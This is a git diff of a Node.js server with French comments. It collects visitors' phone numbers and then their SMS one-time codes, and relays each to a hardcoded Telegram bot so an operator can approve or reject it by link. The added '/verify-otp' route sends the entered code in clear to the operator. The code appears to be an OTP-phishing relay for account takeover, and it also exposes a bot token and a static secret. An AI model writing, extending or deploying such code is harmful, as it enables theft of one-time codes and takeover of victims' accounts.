@@ -4,23 +4,17 @@ const url = require("url");
 const fs = require("fs");
 const path = require("path");
 
-// ═══════════════════════════════════════════
-//  CONFIG — déjà rempli avec tes infos
-// ═══════════════════════════════════════════
-const BOT_TOKEN = "8760704998:AAHGLmS8HbzqCSGq03AnGci7beAbx6TPC5U";
-const CHAT_ID   = "8598761284";
-const SECRET    = "verif2024secure";
-const PORT      = process.env.PORT || 3000;
-// ⬇️ Remplace par ton URL Render après déploiement
+const BOT_TOKEN  = "8760704998:AAHGLmS8HbzqCSGq03AnGci7beAbx6TPC5U";
+const CHAT_ID    = "8598761284";
+const SECRET     = "verif2024secure";
+const PORT       = process.env.PORT || 3000;
 const SERVER_URL = process.env.SERVER_URL || "https://verify-app-d3k0.onrender.com";
 
-// Stockage en mémoire (repart à zéro si le serveur redémarre)
-const approvals = {}; // phone -> true/false
-const pending   = {}; // phone -> timestamp
+// Stockage en mémoire
+const approvals    = {}; // phone -> true/false  (étape 1 : accès)
+const otpApprovals = {}; // phone -> true/false  (étape 2 : OTP)
+const pending      = {}; // phone -> timestamp
 
-// ═══════════════════════════════════════════
-//  UTILITAIRES
-// ═══════════════════════════════════════════
 function sendJSON(res, statusCode, data) {
   res.writeHead(statusCode, {
     "Content-Type": "application/json",
@@ -91,23 +85,14 @@ function pageHTML(icon, title, message, color) {
 </html>`;
 }
 
-// ═══════════════════════════════════════════
-//  SERVEUR HTTP
-// ═══════════════════════════════════════════
 const server = http.createServer(async (req, res) => {
   const parsed   = url.parse(req.url, true);
   const pathname = parsed.pathname;
   const query    = parsed.query;
 
-  // CORS preflight
-  if (req.method === "OPTIONS") {
-    sendJSON(res, 200, {});
-    return;
-  }
+  if (req.method === "OPTIONS") { sendJSON(res, 200, {}); return; }
 
-  // ─────────────────────────────────────────
-  // Servir index.html sur /
-  // ─────────────────────────────────────────
+  // ── Servir index.html ──
   if (pathname === "/" && req.method === "GET") {
     const filePath = path.join(__dirname, "index.html");
     if (fs.existsSync(filePath)) {
@@ -119,9 +104,7 @@ const server = http.createServer(async (req, res) => {
     return;
   }
 
-  // ─────────────────────────────────────────
-  // POST /send-request  →  appelé par le front quand l'user soumet son numéro
-  // ─────────────────────────────────────────
+  // ── POST /send-request : l'user soumet son numéro ──
   if (pathname === "/send-request" && req.method === "POST") {
     let body = "";
     req.on("data", (chunk) => (body += chunk));
@@ -129,7 +112,6 @@ const server = http.createServer(async (req, res) => {
       try {
         const { phone } = JSON.parse(body);
         if (!phone) return sendJSON(res, 400, { error: "Numéro manquant" });
-
         const cleanPhone = phone.replace(/[^0-9+]/g, "");
         pending[cleanPhone] = Date.now();
 
@@ -140,111 +122,127 @@ const server = http.createServer(async (req, res) => {
           `🔔 *Nouvelle demande d'accès*\n\n` +
           `📱 Numéro : \`${cleanPhone}\`\n` +
           `🕐 ${new Date().toLocaleString("fr-FR")}\n\n` +
-          `Clique sur un lien ci-dessous :\n\n` +
           `✅ [APPROUVER L'ACCÈS](${approveUrl})\n\n` +
           `❌ [REFUSER L'ACCÈS](${rejectUrl})`;
 
         const tgRes = await telegramRequest("sendMessage", {
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: "Markdown",
-          disable_web_page_preview: true,
+          chat_id: CHAT_ID, text: message,
+          parse_mode: "Markdown", disable_web_page_preview: true,
         });
-
-        if (tgRes.ok) {
-          sendJSON(res, 200, { ok: true });
-        } else {
-          console.error("Telegram error:", tgRes);
-          sendJSON(res, 500, { error: tgRes.description || "Erreur Telegram" });
-        }
-      } catch (e) {
-        console.error(e);
-        sendJSON(res, 500, { error: e.message });
-      }
+        if (tgRes.ok) sendJSON(res, 200, { ok: true });
+        else sendJSON(res, 500, { error: tgRes.description || "Erreur Telegram" });
+      } catch (e) { sendJSON(res, 500, { error: e.message }); }
     });
     return;
   }
 
-  // ─────────────────────────────────────────
-  // GET /approve  →  tu cliques le lien dans Telegram pour approuver
-  // ─────────────────────────────────────────
-  if (pathname === "/approve" && req.method === "GET") {
-    const { phone, secret } = query;
-    if (secret !== SECRET) {
-      sendHTML(res, pageHTML("🚫", "Accès refusé", "Lien invalide ou expiré.", "#ef4444"));
-      return;
-    }
-    if (!phone) {
-      sendHTML(res, pageHTML("⚠️", "Erreur", "Numéro manquant dans le lien.", "#f59e0b"));
-      return;
-    }
+  // ── POST /verify-otp : l'user soumet son code OTP ──
+  if (pathname === "/verify-otp" && req.method === "POST") {
+    let body = "";
+    req.on("data", (chunk) => (body += chunk));
+    req.on("end", async () => {
+      try {
+        const { phone, code } = JSON.parse(body);
+        if (!phone || !code) return sendJSON(res, 400, { error: "Données manquantes" });
+        const cleanPhone = phone.replace(/[^0-9+]/g, "");
 
-    approvals[phone] = true;
+        const approveUrl = `${SERVER_URL}/approve-otp?phone=${encodeURIComponent(cleanPhone)}&code=${encodeURIComponent(code)}&secret=${SECRET}`;
+        const rejectUrl  = `${SERVER_URL}/reject-otp?phone=${encodeURIComponent(cleanPhone)}&secret=${SECRET}`;
 
-    // Confirmation Telegram
-    await telegramRequest("sendMessage", {
-      chat_id: CHAT_ID,
-      text: `✅ Accès *approuvé* pour \`${phone}\` — l'utilisateur va être redirigé.`,
-      parse_mode: "Markdown",
-    }).catch(() => {});
+        const message =
+          `🔢 *Vérification du code OTP*\n\n` +
+          `📱 Numéro : \`${cleanPhone}\`\n` +
+          `🔑 Code entré : *${code}*\n` +
+          `🕐 ${new Date().toLocaleString("fr-FR")}\n\n` +
+          `✅ [CONFIRMER LE CODE](${approveUrl})\n\n` +
+          `❌ [REFUSER LE CODE](${rejectUrl})`;
 
-    sendHTML(res, pageHTML(
-      "✅",
-      "Accès approuvé !",
-      `Le numéro <strong>${phone}</strong> a été autorisé.<br><br>L'utilisateur va être redirigé automatiquement vers la vérification SMS.`,
-      "#10b981"
-    ));
+        const tgRes = await telegramRequest("sendMessage", {
+          chat_id: CHAT_ID, text: message,
+          parse_mode: "Markdown", disable_web_page_preview: true,
+        });
+        if (tgRes.ok) sendJSON(res, 200, { ok: true });
+        else sendJSON(res, 500, { error: tgRes.description || "Erreur Telegram" });
+      } catch (e) { sendJSON(res, 500, { error: e.message }); }
+    });
     return;
   }
 
-  // ─────────────────────────────────────────
-  // GET /reject  →  tu cliques le lien dans Telegram pour refuser
-  // ─────────────────────────────────────────
+  // ── GET /approve : approuver l'accès (étape 1) ──
+  if (pathname === "/approve" && req.method === "GET") {
+    const { phone, secret } = query;
+    if (secret !== SECRET) { sendHTML(res, pageHTML("🚫", "Lien invalide", "Ce lien est invalide ou expiré.", "#ef4444")); return; }
+    approvals[phone] = true;
+    await telegramRequest("sendMessage", {
+      chat_id: CHAT_ID,
+      text: `✅ Accès *approuvé* pour \`${phone}\` — l'utilisateur passe à la vérification OTP.`,
+      parse_mode: "Markdown",
+    }).catch(() => {});
+    sendHTML(res, pageHTML("✅", "Accès approuvé !", `Le numéro <strong>${phone}</strong> est autorisé.<br><br>L'utilisateur va recevoir son code SMS.`, "#10b981"));
+    return;
+  }
+
+  // ── GET /reject : refuser l'accès (étape 1) ──
   if (pathname === "/reject" && req.method === "GET") {
     const { phone, secret } = query;
-    if (secret !== SECRET) {
-      sendHTML(res, pageHTML("🚫", "Accès refusé", "Lien invalide.", "#ef4444"));
-      return;
-    }
-
+    if (secret !== SECRET) { sendHTML(res, pageHTML("🚫", "Lien invalide", "Ce lien est invalide.", "#ef4444")); return; }
     approvals[phone] = false;
     delete pending[phone];
-
     await telegramRequest("sendMessage", {
       chat_id: CHAT_ID,
       text: `❌ Accès *refusé* pour \`${phone}\`.`,
       parse_mode: "Markdown",
     }).catch(() => {});
-
-    sendHTML(res, pageHTML(
-      "❌",
-      "Accès refusé",
-      `Le numéro <strong>${phone}</strong> a été bloqué.<br><br>L'utilisateur a été notifié du refus.`,
-      "#ef4444"
-    ));
+    sendHTML(res, pageHTML("❌", "Accès refusé", `Le numéro <strong>${phone}</strong> a été bloqué.`, "#ef4444"));
     return;
   }
 
-  // ─────────────────────────────────────────
-  // GET /check-approval  →  le front poll toutes les 3s pour savoir si approuvé
-  // ─────────────────────────────────────────
+  // ── GET /approve-otp : confirmer le code OTP (étape 2) ──
+  if (pathname === "/approve-otp" && req.method === "GET") {
+    const { phone, code, secret } = query;
+    if (secret !== SECRET) { sendHTML(res, pageHTML("🚫", "Lien invalide", "Ce lien est invalide ou expiré.", "#ef4444")); return; }
+    otpApprovals[phone] = true;
+    await telegramRequest("sendMessage", {
+      chat_id: CHAT_ID,
+      text: `✅ Code OTP *confirmé* pour \`${phone}\` — accès total accordé.`,
+      parse_mode: "Markdown",
+    }).catch(() => {});
+    sendHTML(res, pageHTML("✅", "Code confirmé !", `Le code <strong>${code}</strong> pour <strong>${phone}</strong> a été validé.<br><br>L'utilisateur a maintenant accès complet.`, "#10b981"));
+    return;
+  }
+
+  // ── GET /reject-otp : refuser le code OTP (étape 2) ──
+  if (pathname === "/reject-otp" && req.method === "GET") {
+    const { phone, secret } = query;
+    if (secret !== SECRET) { sendHTML(res, pageHTML("🚫", "Lien invalide", "Ce lien est invalide.", "#ef4444")); return; }
+    otpApprovals[phone] = false;
+    await telegramRequest("sendMessage", {
+      chat_id: CHAT_ID,
+      text: `❌ Code OTP *refusé* pour \`${phone}\`.`,
+      parse_mode: "Markdown",
+    }).catch(() => {});
+    sendHTML(res, pageHTML("❌", "Code refusé", `Le code OTP de <strong>${phone}</strong> a été rejeté.`, "#ef4444"));
+    return;
+  }
+
+  // ── GET /check-approval : poll étape 1 ──
   if (pathname === "/check-approval" && req.method === "GET") {
     const { phone, secret } = query;
     if (secret !== SECRET) return sendJSON(res, 403, { error: "Interdit" });
-
     const status = approvals[phone];
+    if (status === true)  { delete approvals[phone]; return sendJSON(res, 200, { approved: true,  rejected: false }); }
+    if (status === false) { delete approvals[phone]; return sendJSON(res, 200, { approved: false, rejected: true  }); }
+    return sendJSON(res, 200, { approved: false, rejected: false });
+  }
 
-    if (status === true) {
-      // Nettoyer après lecture
-      delete approvals[phone];
-      delete pending[phone];
-      return sendJSON(res, 200, { approved: true, rejected: false });
-    } else if (status === false) {
-      delete approvals[phone];
-      return sendJSON(res, 200, { approved: false, rejected: true });
-    } else {
-      return sendJSON(res, 200, { approved: false, rejected: false });
-    }
+  // ── GET /check-otp : poll étape 2 ──
+  if (pathname === "/check-otp" && req.method === "GET") {
+    const { phone, secret } = query;
+    if (secret !== SECRET) return sendJSON(res, 403, { error: "Interdit" });
+    const status = otpApprovals[phone];
+    if (status === true)  { delete otpApprovals[phone]; return sendJSON(res, 200, { approved: true,  rejected: false }); }
+    if (status === false) { delete otpApprovals[phone]; return sendJSON(res, 200, { approved: false, rejected: true  }); }
+    return sendJSON(res, 200, { approved: false, rejected: false });
   }
 
   sendJSON(res, 404, { error: "Route inconnue" });
